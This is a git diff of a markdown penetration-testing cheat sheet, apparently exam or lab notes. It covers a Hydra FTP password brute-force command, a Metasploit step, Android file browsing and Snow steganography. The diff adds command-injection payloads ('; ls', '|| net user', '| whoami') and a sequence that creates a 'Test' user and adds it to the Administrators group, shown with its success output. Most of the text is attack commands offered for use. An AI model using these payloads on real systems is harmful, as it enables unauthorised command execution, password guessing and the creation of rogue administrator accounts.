@@ -40,7 +40,7 @@ set TARGETURI http://IP:port
 set USERNAME admin
 ->run
 ```
-### 7. FTP Passowrd find
+### 7. FTP Password find
   $ hydra -l user -P passlist.txt ftp://IP
 
 ### 8. Prints the route that a packet takes to reach the host
@@ -62,7 +62,7 @@ set USERNAME admin
   IP address again of android device
   pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
 ```
-### 10. Stegography
+### 10. Stegnography
   ```
   $ Snow.exe -C -p “given_password” file_name.txt  (Pass tu hobo = 'test')
   -C  compressing / uncompressing
@@ -114,7 +114,21 @@ RDP
 Severity: Low        Severity: Medium           Severity: High          
 1; ls                1& ls                      || ls
 1; id                1& net user                || net user
-1; net user    
+1; net user
+| ls
+```
+#### Others cmd: 
+```
+| hostname
+| whoami
+| dir C:\path.txt
+| type path.txt
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+Successfully created the "Test" user account.
 ```
 
 
